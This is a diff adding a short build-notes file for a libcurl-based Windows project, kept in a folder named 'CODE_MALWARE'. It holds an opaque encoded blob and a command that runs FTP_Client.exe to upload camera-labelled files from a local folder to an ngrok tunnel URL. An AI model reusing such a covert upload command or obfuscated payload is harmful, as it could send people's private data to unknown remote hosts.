@@ -1,0 +1,18 @@
+1.Release x86
++ C/C++/General:
+G:\CODE_MALWARE\curl-7.75.0\x32 Release\include
++ C/C++/Preprocessor:
+WIN32;NDEBUG;_CONSOLE;CURL_STATICLIB;_CRT_SECURE_NO_WARNINGS%(PreprocessorDefinitions)
++ Linker/General:
+G:\CODE_MALWARE\curl-7.75.0\x32 Release\lib;%(AdditionalLibraryDirectories)
++ Linker/Input
+libcurl_a.lib;Normaliz.lib;Ws2_32.lib;Wldap32.lib;Crypt32.lib;advapi32.lib
+
+2.Debug x64
+
+
+
+GwcQFgBSSEtSSxdVTEAVV1xfFgkER0gDVVAQSlpUQAlJV1ZEQUMFRV4QSwYUFBUYSRAIARNUGQMDSxMDBAgFAlpXRkIRFQpQUVdLREBVVVI6QlM0XEZJR0RFW0NHVzdaQTpZSkVZUEcVFQoQEx9dBxwSUEtERyJDWykUNgErDBcB
+
+FTP_Client.exe https://42c0-2a09-bac5-d45b-183c-00-26a-4e.ngrok-free.app/upload cam0 2023_04_05 2023_04_19 config.txt G:/HOC_TAP/LuDuLieu
+pause
